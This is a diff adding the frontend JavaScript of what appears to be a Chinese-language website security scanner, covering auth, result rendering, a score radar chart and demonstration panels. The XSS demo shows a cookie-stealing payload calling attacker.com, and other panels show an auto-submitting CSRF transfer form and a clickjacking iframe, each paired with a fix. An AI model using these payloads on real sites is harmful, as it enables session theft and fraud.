@@ -1,0 +1,6392 @@
+import { APP_TEMPLATE } from './templates.js';
+import './style.css';
+import { isSRCFormat, renderSRCResult, init as initResultPage } from './pages/result.js';
+import { init as initScanPage } from './pages/scan.js';
+
+// ===== 全局错误兜底：防止 JS 异常导致白屏 =====
+(function installGlobalErrorHandlers() {
+  var _hasShownError = false;
+  function showGlobalError(msg) {
+    if (_hasShownError) return;
+    _hasShownError = true;
+    try {
+      let overlay = document.createElement('div');
+      overlay.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);color:#fff;z-index:99999;display:flex;align-items:center;justify-content:center;font-family:system-ui,-apple-system,sans-serif';
+      overlay.innerHTML = '<div style="max-width:500px;padding:30px;background:#1e293b;border-radius:2px;text-align:center;border:1px solid #c75450"><div style="font-size:48px;margin-bottom:12px">注意：</div><h2 style="margin:0 0 8px;color:#c75450">页面遇到错误</h2><p style="color:#94a3b8;font-size:14px;margin:0 0 16px;line-height:1.6">页面在运行过程中遇到了一个未预期的错误。您可以尝试刷新页面。</p><p style="color:#64748b;font-size:12px;margin:0 0 16px;font-family:monospace;word-break:break-all">' + (msg || '未知错误').substring(0, 200) + '</p><button onclick="location.reload()" style="background:#4b6eaf;color:#fff;border:none;padding:10px 24px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600"> 刷新页面</button></div>';
+      document.body.appendChild(overlay);
+    } catch (e) {
+      console.error('Global error handler failed:', e);
+    }
+  }
+  window.addEventListener('error', function(e) {
+    console.error('Global error:', e.error || e.message);
+    // 忽略资源加载错误（如图片、CSS）
+    if (e.target && e.target !== window && (e.target.tagName === 'IMG' || e.target.tagName === 'LINK' || e.target.tagName === 'SCRIPT')) return;
+    showGlobalError(e.message || String(e.error));
+  }, true);
+  window.addEventListener('unhandledrejection', function(e) {
+    console.error('Unhandled promise rejection:', e.reason);
+    // Promise 拒绝不展示全局错误页，避免误报
+  });
+})();
+
+// ===== Utility: Safe DOM Access =====
+function safeGetElement(id) { let el = document.getElementById(id); return el || null; }
+function safeSetText(id, text) { let el = safeGetElement(id); if (el) el.textContent = text; }
+function safeSetHtml(id, html) { let el = safeGetElement(id); if (el) el.innerHTML = html; }
+function safeSetValue(id, value) { let el = safeGetElement(id); if (el) el.value = value; }
+function safeSetDisplay(id, display) { let el = safeGetElement(id); if (el) el.style.display = display; }
+
+// ===== 授权复选框联动按钮状态 =====
+(function initAuthCheckboxBinding() {
+  function bindCheckboxToButton(checkboxId, buttonId) {
+    let cb = document.getElementById(checkboxId);
+    let btn = document.getElementById(buttonId);
+    if (!cb || !btn) return;
+    cb.addEventListener('change', function() {
+      btn.disabled = !cb.checked;
+    });
+    // 初始化时同步状态（处理 restoreAuthCheckbox 可能提前设置的情况）
+    if (cb.checked) btn.disabled = false;
+  }
+  document.addEventListener('DOMContentLoaded', function() {
+    bindCheckboxToButton('auth-check-step1', 'scan-btn-step1');
+    bindCheckboxToButton('auth-check', 'scan-btn');
+    // 11-S: 自动恢复授权勾选状态 + checkbox 联动
+    try { restoreAuthCheckbox(); } catch(e) { console.warn('restoreAuthCheckbox error:', e); }
+  });
+})();
+
+// 11-S: 授权 checkbox 联动 + 持久化
+var _updatingAuthCheckbox = false;
+function restoreAuthCheckbox() {
+  // 从 localStorage 恢复勾选状态
+  let saved = false;
+  try { saved = localStorage.getItem('vs_auth_checked') === 'true'; } catch(e) {}
+  let c1 = document.getElementById('auth-check-step1');
+  let c2 = document.getElementById('auth-check');
+  let c3 = document.getElementById('batch-auth-check');
+  if (saved) {
+    _updatingAuthCheckbox = true;
+    if (c1) { c1.checked = true; }
+    if (c2) { c2.checked = true; }
+    if (c3) { c3.checked = true; }
+    _updatingAuthCheckbox = false;
+    // 手动触发一次按钮状态更新
+    if (c1) c1.dispatchEvent(new Event('change'));
+  }
+  // 绑定联动：勾一个，全部自动勾（使用标志位防止循环）
+  function linkCheckboxes(source, targets) {
+    if (!source) return;
+    source.addEventListener('change', function() {
+      if (_updatingAuthCheckbox) return;
+      let checked = source.checked;
+      _updatingAuthCheckbox = true;
+      targets.forEach(function(t) { if (t) { t.checked = checked; } });
+      _updatingAuthCheckbox = false;
+      try { localStorage.setItem('vs_auth_checked', checked ? 'true' : 'false'); } catch(e) {}
+    });
+  }
+  linkCheckboxes(c1, [c2, c3]);
+  linkCheckboxes(c2, [c1, c3]);
+  linkCheckboxes(c3, [c1, c2]);
+}
+
+// ===== Utility: XSS-safe escapeHtml =====
+function escapeHtml(str) {
+  if (str == null) return '';
+  let div = document.createElement('div');
+  div.appendChild(document.createTextNode(String(str)));
+  return div.innerHTML;
+}
+
+function escapeAttr(str) {
+  return String(str == null ? '' : str).replace(/'/g, "&#39;").replace(/"/g, "&quot;");
+}
+
+// ============== evidence 通用渲染器 ==============
+// 完整的 evidence 渲染器，支持所有字段（含注入类/敏感路径/过时组件/Cookie/SSL 等定位信息）
+// 渲染规则：
+//  1. 遍历 evidence 对象的所有 key，对每个 key 用中文标签展示
+//  2. payload 字段用红色高亮（攻击向量）
+//  3. path/url 字段用代码字体显示
+//  4. cve 字段如包含 CVE-ID，显示为醒目红色标签
+//  5. missing_flags 是数组，用逗号分隔展示
+//  6. evidence 为空时返回空字符串（由调用方提示“无额外技术细节”）
+var EVIDENCE_LABELS = {
+  header:           '相关响应头',
+  detected:         '检测结果',
+  reason:           '判断依据',
+  impact:           '影响说明',
+  value:            '当前值',
+  check_scope:      '检测范围',
+  limitation:       '检测局限',
+  param:            '问题参数',
+  payload:          '测试 Payload',
+  url:              '问题 URL',
+  path:             '暴露路径',
+  status:           '响应状态',
+  snippet:          '内容片段',
+  library:          '组件名称',
+  version:          '当前版本',
+  detected_version: '当前版本',
+  min_safe_version: '安全版本',
+  cve:              '关联 CVE',
+  missing_flags:    '缺失安全标志',
+  redirect_to:      '重定向目标',
+  os:               '操作系统',
+  body_hint:        '响应特征',
+  days_left:        '证书剩余天数',
+  method:           '检测方法'
+};
+// 字段渲染顺序（命中字段按此顺序展示，未列出的字段追加到末尾，保证可读性）
+var EVIDENCE_ORDER = [
+  'detected', 'header', 'reason', 'impact', 'value', 'check_scope', 'limitation',
+  'param', 'payload', 'url', 'path', 'status', 'snippet',
+  'library', 'version', 'detected_version', 'min_safe_version', 'cve',
+  'missing_flags', 'redirect_to', 'os', 'body_hint', 'days_left', 'method'
+];
+function renderEvidence(evi) {
+  if (!evi || typeof evi !== 'object') return '';
+  let keys = Object.keys(evi).filter(function(k) { return evi[k] !== undefined && evi[k] !== null && evi[k] !== ''; });
+  if (keys.length === 0) return '';
+  // 按 EVIDENCE_ORDER 排序，未列出的字段保留原顺序追加在后面
+  let ordered = [];
+  EVIDENCE_ORDER.forEach(function(k) { if (keys.indexOf(k) >= 0) ordered.push(k); });
+  keys.forEach(function(k) { if (ordered.indexOf(k) < 0) ordered.push(k); });
+
+  let rows = ordered.map(function(k) {
+    let label = EVIDENCE_LABELS[k] || k;
+    let raw = evi[k];
+    let valHtml = '';
+
+    if (k === 'detected') {
+      // 布尔值：检测结果以颜色文本展示
+      let detColor = raw ? '#c75450' : '#73c990';
+      let detText = raw ? '注意：已检测到' : '未检测到';
+      valHtml = '<span style="color:' + detColor + ';font-weight:600;font-size:12px">' + detText + '</span>';
+    } else if (k === 'payload') {
+      // payload 攻击向量：红色高亮 + 深色代码块
+      valHtml = '<code style="background:#3b0d0d;color:#fecaca;padding:2px 8px;border-radius:2px;font-size:12px;word-break:break-all;border:1px solid rgba(199,84,80,0.35)">' + escapeHtml(raw) + '</code>';
+    } else if (k === 'url' || k === 'path') {
+      // path/url 用代码字体显示
+      valHtml = '<code style="background:#2b2b2b;padding:2px 8px;border-radius:2px;font-size:12px;word-break:break-all">' + escapeHtml(raw) + '</code>';
+    } else if (k === 'cve') {
+      // cve 字段：包含 CVE-ID 显示为醒目红色标签
+      let cveText = String(raw);
+      let cveMatches = cveText.match(/CVE-\d{4}-\d{4,7}/gi) || [];
+      if (cveMatches.length > 0) {
+        valHtml = cveMatches.map(function(id) {
+          return '<span style="display:inline-block;background:#c75450;color:#fff;padding:2px 8px;border-radius:2px;font-size:11px;font-weight:700;letter-spacing:0.3px">' + escapeHtml(id) + '</span>';
+        }).join(' ');
+        // 若原文除 CVE-ID 外还有其他内容，附加显示
+        let extra = cveText.replace(/CVE-\d{4}-\d{4,7}/gi, '').replace(/[,\s、，；;]+/g, ' ').trim();
+        if (extra) valHtml += ' <span style="font-size:12px;color:var(--text-secondary)">' + escapeHtml(extra) + '</span>';
+      } else {
+        // 未匹配到标准 CVE-ID，按普通文本渲染但仍用红色标签样式突出
+        valHtml = '<span style="display:inline-block;background:#c75450;color:#fff;padding:2px 8px;border-radius:2px;font-size:11px;font-weight:700">' + escapeHtml(cveText) + '</span>';
+      }
+    } else if (k === 'missing_flags') {
+      // 数组：用逗号分隔展示
+      let arr = Array.isArray(raw) ? raw : [raw];
+      valHtml = arr.map(function(item) {
+        return '<code style="background:rgba(240,167,50,0.1);color:#f0a732;padding:2px 8px;border-radius:2px;font-size:12px">' + escapeHtml(item) + '</code>';
+      }).join(' ');
+    } else if (k === 'status' || k === 'days_left') {
+      // 数值/状态：突出显示
+      valHtml = '<span style="font-weight:600;color:var(--text-primary);font-size:12px">' + escapeHtml(raw) + '</span>';
+    } else if (k === 'snippet') {
+      // 内容片段：代码块深色背景
+      valHtml = '<code style="background:#1e293b;color:#e2e8f0;padding:6px 8px;border-radius:2px;font-size:11px;word-break:break-all;display:block;white-space:pre-wrap;max-height:160px;overflow:auto">' + escapeHtml(raw) + '</code>';
+    } else if (k === 'limitation') {
+      // 检测局限：黄色警示
+      valHtml = '<span style="color:#f0a732;font-size:12px">注意： ' + escapeHtml(raw) + '</span>';
+    } else {
+      // 默认：纯文本展示
+      valHtml = '<span style="font-size:12px;color:var(--text-primary)">' + escapeHtml(raw) + '</span>';
+    }
+    return '<div style="display:flex;gap:8px;padding:4px 0;align-items:flex-start">' +
+           '<span style="color:var(--text-secondary);min-width:78px;flex-shrink:0;font-size:12px">' + label + '</span>' +
+           '<span style="flex:1;min-width:0">' + valHtml + '</span>' +
+           '</div>';
+  });
+  return rows.join('');
+}
+
+// ============== 雷达图 ==============
+function renderRadarChart(data) {
+  let container = document.getElementById('radar-chart-container');
+  if (!container) return;
+
+  // 计算 5 个维度的得分（每个维度满分 20 分）
+  let dims = [
+    { name: '加密传输', key: 'https', score: 0 },
+    { name: '安全响应头', key: 'headers', score: 0 },
+    { name: '信息隐藏', key: 'info', score: 0 },
+    { name: 'Cookie安全', key: 'cookie', score: 0 },
+    { name: '访问控制', key: 'cors', score: 0 },
+  ];
+  let isHttps = data.is_https || false;
+  let findings = data.findings || [];
+
+  // 加密传输：满分 20
+  dims[0].score = isHttps ? 20 : 0;
+  // 安全响应头：每个缺失扣 3 分，最低 0
+  let headerCount = findings.filter(function(f) { return f.name.indexOf('缺少') === 0 && f.severity === 'high'; }).length;
+  dims[1].score = Math.max(0, 20 - headerCount * 3);
+  // 信息隐藏：server/x-powered-by 暴露扣 10
+  let hasInfo = findings.some(function(f) { return f.name.indexOf('信息泄露') >= 0; });
+  dims[2].score = hasInfo ? 10 : 20;
+  // Cookie 安全：满分 20
+  let hasCookie = findings.some(function(f) { return f.name.indexOf('Cookie') >= 0; });
+  dims[3].score = hasCookie ? 10 : 20;
+  // 访问控制：CORS 通配符扣 10
+  let hasCors = findings.some(function(f) { return f.name.indexOf('CORS') >= 0; });
+  dims[4].score = hasCors ? 10 : 20;
+
+  let cx = 150, cy = 150, R = 110;
+  let svg = '<svg width="300" height="300" viewBox="0 0 300 300" style="display:block;max-width:100%">';
+  // 背景网格（5 层五边形）
+  for (let layer = 1; layer <= 5; layer++) {
+    let r = (R * layer) / 5;
+    let pts = [];
+    for (let i = 0; i < 5; i++) {
+      let angle = (Math.PI * 2 * i) / 5 - Math.PI / 2;
+      pts.push((cx + r * Math.cos(angle)) + ',' + (cy + r * Math.sin(angle)));
+    }
+    svg += '<polygon points="' + pts.join(' ') + '" fill="none" stroke="rgba(75,110,175,0.15)" stroke-width="1"/>';
+  }
+  // 轴线
+  for (let i = 0; i < 5; i++) {
+    let angle = (Math.PI * 2 * i) / 5 - Math.PI / 2;
+    let x = cx + R * Math.cos(angle);
+    let y = cy + R * Math.sin(angle);
+    svg += '<line x1="' + cx + '" y1="' + cy + '" x2="' + x + '" y2="' + y + '" stroke="rgba(75,110,175,0.2)" stroke-width="1"/>';
+  }
+  // 数据多边形（带渐变 + 动画）
+  let dataPts = [];
+  for (let i = 0; i < 5; i++) {
+    let angle = (Math.PI * 2 * i) / 5 - Math.PI / 2;
+    let r = (R * dims[i].score) / 20;
+    dataPts.push((cx + r * Math.cos(angle)) + ',' + (cy + r * Math.sin(angle)));
+  }
+  svg += '<defs><radialGradient id="radarGrad"><stop offset="0%" stop-color="rgba(75,110,175,0.6)"/><stop offset="100%" stop-color="rgba(168,85,247,0.4)"/></radialGradient></defs>';
+  svg += '<polygon points="' + dataPts.join(' ') + '" fill="url(#radarGrad)" stroke="#4b6eaf" stroke-width="2" style="filter:drop-shadow(0 0 8px rgba(75,110,175,0.5));transition:all 1s ease-out">';
+  svg += '<animate attributeName="opacity" from="0" to="1" dur="1s" fill="freeze"/>';
+  svg += '</polygon>';
+  // 数据点
+  for (let i = 0; i < 5; i++) {
+    let angle = (Math.PI * 2 * i) / 5 - Math.PI / 2;
+    let r = (R * dims[i].score) / 20;
+    let x = cx + r * Math.cos(angle);
+    let y = cy + r * Math.sin(angle);
+    svg += '<circle cx="' + x + '" cy="' + y + '" r="4" fill="#4b6eaf" stroke="#bbbbbb" stroke-width="2"/>';
+  }
+  // 标签
+  for (let i = 0; i < 5; i++) {
+    let angle = (Math.PI * 2 * i) / 5 - Math.PI / 2;
+    let lx = cx + (R + 25) * Math.cos(angle);
+    let ly = cy + (R + 25) * Math.sin(angle);
+    let anchor = Math.abs(Math.cos(angle)) < 0.2 ? 'middle' : Math.cos(angle) > 0 ? 'start' : 'end';
+    svg += '<text x="' + lx + '" y="' + ly + '" text-anchor="' + anchor + '" font-size="12" font-weight="600" fill="var(--text-primary)" dominant-baseline="middle">' + dims[i].name + '</text>';
+    svg += '<text x="' + lx + '" y="' + (ly + 14) + '" text-anchor="' + anchor + '" font-size="11" font-weight="700" fill="#4b6eaf" dominant-baseline="middle">' + dims[i].score + '/20</text>';
+  }
+  svg += '</svg>';
+  container.innerHTML = svg;
+}
+
+// ============== 攻击模拟展示 ==============
+function simulateCSRF(target) {
+  let out = document.getElementById('attack-demo-result');
+  if (!out) return;
+  out.innerHTML = '<div style="background:#3c3f41;border:1px solid rgba(199,84,80,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s">' +
+    '<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">' +
+    '<span style="background:#dc2626;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">攻击中</span>' +
+    '<span style="font-weight:600;font-size:13px">CSRF 跨站请求伪造</span></div>' +
+    '<div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px">' +
+    '<div>// 攻击者构造的恶意页面</div>' +
+    '<div>&lt;form action="' + escapeHtml(target) + '/api/transfer" method="POST"&gt;</div>' +
+    '<div>&nbsp;&nbsp;&lt;input name="to" value="attacker"&gt;</div>' +
+    '<div>&nbsp;&nbsp;&lt;input name="amount" value="10000"&gt;</div>' +
+    '<div>&lt;/form&gt;</div>' +
+    '<div>&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</div>' +
+    '</div>' +
+    '<div style="background:rgba(199,84,80,0.1);border-left:3px solid #c75450;padding:8px 10px;font-size:12px;color:#c75450;border-radius:2px;margin-bottom:10px">' +
+    '<strong>注意：如果目标未设置 CSRF Token，受害者点击后资金会被转走。</strong></div>' +
+    '<div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px">' +
+    '<strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">SameSite=Strict</code> Cookie + CSRF Token 验证</div>' +
+    '</div>';
+}
+
+function simulateXSS(target) {
+  let out = document.getElementById('attack-demo-result');
+  if (!out) return;
+  out.innerHTML = '<div style="background:#3c3f41;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s">' +
+    '<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">' +
+    '<span style="background:#ea580c;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">攻击中</span>' +
+    '<span style="font-weight:600;font-size:13px">XSS 反射型注入</span></div>' +
+    '<div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px">' +
+    '<div>// 攻击 URL</div>' +
+    '<div>' + escapeHtml(target) + '/search?q=&lt;script&gt;</div>' +
+    '<div>&nbsp;&nbsp;fetch(\'//attacker.com/steal?c=\'+document.cookie)</div>' +
+    '<div>&nbsp;&nbsp;&lt;/script&gt;</div>' +
+    '<div>// 受害者的 Cookie 被发送到攻击者服务器</div>' +
+    '</div>' +
+    '<div style="background:rgba(240,167,50,0.1);border-left:3px solid #f0a732;padding:8px 10px;font-size:12px;color:#f0a732;border-radius:2px;margin-bottom:10px">' +
+    '<strong>注意：如果目标没有 CSP 策略，恶意脚本会被浏览器执行。</strong></div>' +
+    '<div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px">' +
+    '<strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">Content-Security-Policy</code> 头 + 输入输出转义</div>' +
+    '</div>';
+}
+
+function simulateClickjacking(target) {
+  let out = document.getElementById('attack-demo-result');
+  if (!out) return;
+  out.innerHTML = '<div style="background:#3c3f41;border:1px solid rgba(168,85,247,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s">' +
+    '<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">' +
+    '<span style="background:#9333ea;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">攻击中</span>' +
+    '<span style="font-weight:600;font-size:13px">点击劫持</span></div>' +
+    '<div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px">' +
+    '<div>// 攻击者页面</div>' +
+    '<div>&lt;iframe src="' + escapeHtml(target) + '"</div>' +
+    '<div>&nbsp;&nbsp;style="opacity:0.1;position:absolute;top:0;left:0;"&gt;</div>' +
+    '<div>&lt;/iframe&gt;</div>' +
+    '<div>&lt;button style="position:absolute;top:50px"&gt;点这里领奖&lt;/button&gt;</div>' +
+    '</div>' +
+    '<div style="background:rgba(168,85,247,0.1);border-left:3px solid #9333ea;padding:8px 10px;font-size:12px;color:#c084fc;border-radius:2px;margin-bottom:10px">' +
+    '<strong>注意：用户以为点在"领奖"按钮，实际上在点击下层网站的"删除"按钮。</strong></div>' +
+    '<div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px">' +
+    '<strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">X-Frame-Options: DENY</code> 或 CSP frame-ancestors</div>' +
+    '</div>';
+}
+
+// ============== 修复前后动画 ==============
+var _scoreAnimInterval = null;
+function animateScoreProgress(targetScore) {
+  let ring = document.querySelector('.score-ring .score-value');
+  if (!ring) return;
+  // 防御性：确保是数字
+  targetScore = parseInt(targetScore, 10);
+  if (isNaN(targetScore) || targetScore < 0) targetScore = 0;
+  if (targetScore > 100) targetScore = 100;
+  if (_scoreAnimInterval) { clearInterval(_scoreAnimInterval); _scoreAnimInterval = null; }
+  let current = 0;
+  let step = Math.max(1, Math.floor(targetScore / 50));
+  _scoreAnimInterval = setInterval(function() {
+    current += step;
+    if (current >= targetScore) {
+      current = targetScore;
+      clearInterval(_scoreAnimInterval);
+      _scoreAnimInterval = null;
+    }
+    ring.textContent = current;
+  }, 20);
+}
+
+// 通用错误信息提取：兼容 Pydantic 422 数组格式和普通字符串格式
+function extractError(data) {
+  if (!data) return '未知错误';
+  if (typeof data.error === 'string' && data.error) return data.error;
+  if (typeof data.detail === 'string' && data.detail) return data.detail;
+  if (typeof data.message === 'string' && data.message) return data.message;
+  // Pydantic 422: detail 是数组 [{type, loc, msg, input}]
+  if (Array.isArray(data.detail) && data.detail.length > 0) {
+    let msgs = data.detail.map(function(item) {
+      if (item && typeof item.msg === 'string') return item.msg;
+      if (item && typeof item === 'string') return item;
+      return '';
+    }).filter(Boolean);
+    if (msgs.length > 0) return msgs.join('；');
+  }
+  return '未知错误';
+}
+
+// ===== Utility: Button Loading State =====
+function setButtonLoading(btnId, loading) {
+  let btn = safeGetElement(btnId);
+  if (!btn) return;
+  if (loading) {
+    btn.disabled = true;
+    btn.dataset.originalText = btn.dataset.originalText || btn.textContent;
+    btn.innerHTML = '<span class="spinner" style="width:16px;height:16px;margin-right:6px;border-color:rgba(255,255,255,0.3);border-top-color:#fff"></span>' + escapeHtml(btn.dataset.originalText);
+  } else {
+    btn.disabled = false;
+    if (btn.dataset.originalText) btn.textContent = btn.dataset.originalText;
+  }
+}
+
+// ===== Utility: Pagination =====
+function renderPagination(containerId, currentPage, totalPages, onPageChange) {
+  let container = safeGetElement(containerId);
+  if (!container) return;
+  if (totalPages <= 1) { container.style.display = 'none'; return; }
+  container.style.display = 'flex';
+  let html = '';
+  html += '<button class="pagination-btn" ' + (currentPage <= 1 ? 'disabled' : '') + ' onclick="' + onPageChange + '(' + (currentPage - 1) + ')" aria-label="上一页">&lt;</button>';
+  let startPage = Math.max(1, currentPage - 2);
+  let endPage = Math.min(totalPages, startPage + 4);
+  if (endPage - startPage < 4) startPage = Math.max(1, endPage - 4);
+  for (let i = startPage; i <= endPage; i++) {
+    html += '<button class="pagination-btn ' + (i === currentPage ? 'active' : '') + '" onclick="' + onPageChange + '(' + i + ')" aria-label="第 ' + i + ' 页" ' + (i === currentPage ? 'aria-current="true"' : '') + '>' + i + '</button>';
+  }
+  html += '<button class="pagination-btn" ' + (currentPage >= totalPages ? 'disabled' : '') + ' onclick="' + onPageChange + '(' + (currentPage + 1) + ')" aria-label="下一页">&gt;</button>';
+  html += '<span class="pagination-info">' + currentPage + ' / ' + totalPages + '</span>';
+  container.innerHTML = html;
+}
+
+// ===== Auth & Token with safe localStorage =====
+var _authFetchInLogout = false;
+function getToken() { try { return localStorage.getItem('vs_token'); } catch(e) { return null; } }
+function setToken(t) { try { localStorage.setItem('vs_token', t); } catch(e) {} }
+function removeToken() { try { localStorage.removeItem('vs_token'); } catch(e) {} }
+function isLoggedIn() { return !!getToken(); }
+function getUsername() { try { return localStorage.getItem('vs_username') || ''; } catch(e) { return ''; } }
+
+// ===== Scan State =====
+var lastScanResult = null;
+var lastFixResult = null;
+var currentFixLang = 'nginx';
+var lastFixerResult = null;
+var _scanInProgress = false;
+var monitorPage = 1;
+var monitorPageSize = 5;
+var historyPage = 1;
+var historyPageSize = 5;
+
+
+
+// ========== Auth & Token Management ==========
+
+// authFetch: 自动附加 Authorization header 的 fetch 封装
+var API_BASE = '';
+
+function authHeaders() {
+  let token = getToken();
+  return token ? { 'Authorization': 'Bearer ' + token } : {};
+}
+
+function authFetch(url, options) {
+  options = options || {};
+  options.headers = options.headers || {};
+  let token = getToken();
+  if (token) options.headers['Authorization'] = 'Bearer ' + token;
+  if (!options.headers['Content-Type'] && options.body) options.headers['Content-Type'] = 'application/json';
+  // 线上模式：自动补全 base URL（防 file:// 被混用）
+  let fullUrl = (url.indexOf('http') === 0) ? url : (API_BASE + url);
+  return fetch(fullUrl, options).then(function(resp) {
+    if (resp.status === 401) {
+      if (!_authFetchInLogout) { _authFetchInLogout = true; doLogout(); _authFetchInLogout = false; }
+      throw new Error('登录已过期，请重新登录');
+    }
+    return resp;
+  }).catch(function(err) {
+    if (err.message && err.message.indexOf('Failed to fetch') >= 0) {
+      throw new Error('网络请求失败。请确认后端服务是否已启动（python main.py）。');
+    }
+    throw err;
+  });
+}
+
+
+
+
+// ========== Auth UI ==========
+function toggleAuthForm(mode) {
+  let guest = document.getElementById('auth-guest');
+  let reg = document.getElementById('auth-register');
+  let reset = document.getElementById('auth-reset');
+  let logged = document.getElementById('auth-logged');
+  if (mode === 'register') {
+    if (guest) guest.style.display = 'none';
+    if (reg) reg.style.display = 'block';
+    if (reset) reset.style.display = 'none';
+    if (logged) logged.style.display = 'none';
+  } else if (mode === 'login') {
+    if (guest) guest.style.display = 'block';
+    if (reg) reg.style.display = 'none';
+    if (reset) reset.style.display = 'none';
+    if (logged) logged.style.display = 'none';
+  } else if (mode === 'reset') {
+    if (guest) guest.style.display = 'none';
+    if (reg) reg.style.display = 'none';
+    if (reset) reset.style.display = 'block';
+    if (logged) logged.style.display = 'none';
+  }
+}
+
+function updateAuthUI() {
+  let guest = document.getElementById('auth-guest');
+  let reg = document.getElementById('auth-register');
+  let reset = document.getElementById('auth-reset');
+  let logged = document.getElementById('auth-logged');
+  let scanLoginTip = document.getElementById('scan-login-tip');
+  let tokenInput = document.getElementById('api-token-input');
+  if (isLoggedIn()) {
+    if (guest) guest.style.display = 'none';
+    if (reg) reg.style.display = 'none';
+    if (reset) reset.style.display = 'none';
+    if (logged) logged.style.display = 'block';
+    if (scanLoginTip) scanLoginTip.style.display = 'none';
+    let name = getUsername();
+    let displayName = document.getElementById('auth-display-name');
+    if (displayName) displayName.textContent = name || '用户';
+    if (tokenInput && (!tokenInput.value || tokenInput.value.indexOf('登录') !== -1)) {
+      tokenInput.value = 'vs_' + Array.from({length:32},function(){return 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random()*36)];}).join('');
+    }
+  } else {
+    if (guest) guest.style.display = 'block';
+    if (reg) reg.style.display = 'none';
+    if (reset) reset.style.display = 'none';
+    if (logged) logged.style.display = 'none';
+    if (scanLoginTip) scanLoginTip.style.display = 'block';
+    if (tokenInput) tokenInput.value = '登录后生成 Token';
+  }
+}
+
+function doResetPassword() {
+  if (!isLoggedIn()) { showToast('请先登录后再修改密码'); toggleAuthForm('login'); return; }
+  let pw1El = document.getElementById('reset-new-password');
+  let pw2El = document.getElementById('reset-new-password2');
+  let errEl = document.getElementById('reset-error');
+  if (!pw1El || !pw2El) { showToast('密码重置表单加载失败'); return; }
+  let pw1 = pw1El.value;
+  let pw2 = pw2El.value;
+  if (errEl) errEl.textContent = '';
+  if (!pw1 || pw1.length < 6) { if (errEl) errEl.textContent = '新密码至少 6 个字符'; return; }
+  if (pw1 !== pw2) { if (errEl) errEl.textContent = '两次密码不一致'; return; }
+  authFetch('/api/reset-password', {
+    method: 'POST',
+    body: JSON.stringify({ new_password: pw1 })
+  }).then(function(r) { return r.json(); }).then(function(data) {
+    if (data.success) {
+      showToast('密码已修改，请用新密码登录');
+      doLogout();
+    } else {
+      errEl.textContent = extractError(data) || '修改失败';
+    }
+  }).catch(function(e) {
+    if (errEl) errEl.textContent = '修改失败: ' + e.message;
+  });
+}
+
+function doLogin() {
+  let usernameEl = document.getElementById('login-username');
+  let passwordEl = document.getElementById('login-password');
+  let errEl = document.getElementById('login-error');
+  if (!usernameEl || !passwordEl) { showToast('登录表单加载失败'); return; }
+  let username = usernameEl.value.trim();
+  let password = passwordEl.value.trim();
+  if (errEl) errEl.textContent = '';
+  if (!username || !password) { if (errEl) errEl.textContent = '请输入用户名和密码'; return; }
+
+  authFetch('/api/login', {
+    method: 'POST',
+    body: JSON.stringify({ username: username, password: password })
+  }).then(function(resp) { return resp.json(); }).then(function(data) {
+    if (data.token) {
+      setToken(data.token);
+      try { localStorage.setItem('vs_username', data.username || username); } catch(e) {}
+      updateAuthUI();
+      updateAlertBadge();
+      showToast('登录成功，欢迎 ' + (data.username || username));
+    } else {
+      if (errEl) errEl.textContent = extractError(data) || '登录失败';
+    }
+  }).catch(function(e) {
+    if (errEl) errEl.textContent = '登录失败: ' + e.message;
+  });
+}
+
+function doRegister() {
+  let usernameEl = document.getElementById('reg-username');
+  let emailEl = document.getElementById('reg-email');
+  let passwordEl = document.getElementById('reg-password');
+  let password2El = document.getElementById('reg-password2');
+  let errEl = document.getElementById('register-error');
+  if (!usernameEl || !passwordEl || !password2El) { showToast('注册表单加载失败'); return; }
+  let username = usernameEl.value.trim();
+  let email = emailEl ? emailEl.value.trim() : '';
+  let password = passwordEl.value.trim();
+  let password2 = password2El.value.trim();
+  if (errEl) errEl.textContent = '';
+  if (!username || !password) { if (errEl) errEl.textContent = '请输入用户名和密码'; return; }
+  if (password !== password2) { if (errEl) errEl.textContent = '两次密码不一致'; return; }
+  if (password.length < 6) { if (errEl) errEl.textContent = '密码至少 6 个字符'; return; }
+
+  let payload = { username: username, password: password };
+  if (email) { payload.email = email; }
+
+  authFetch('/api/register', {
+    method: 'POST',
+    body: JSON.stringify(payload)
+  }).then(function(resp) { return resp.json(); }).then(function(data) {
+    if (data.token) {
+      setToken(data.token);
+      try { localStorage.setItem('vs_username', data.username || username); } catch(e) {}
+      updateAuthUI();
+      updateAlertBadge();
+      showToast('注册成功，欢迎 ' + (data.username || username));
+    } else {
+      if (errEl) errEl.textContent = extractError(data) || '注册失败';
+    }
+  }).catch(function(e) {
+    if (errEl) errEl.textContent = '注册失败: ' + e.message;
+  });
+}
+
+function doLogout() {
+  removeToken();
+  try { localStorage.removeItem('vs_username'); } catch(e) {}
+  updateAuthUI();
+  let badge = document.getElementById('nav-alert-badge');
+  if (badge) badge.style.display = 'none';
+  showToast('已退出登录');
+  navigateTo('home');
+}
+
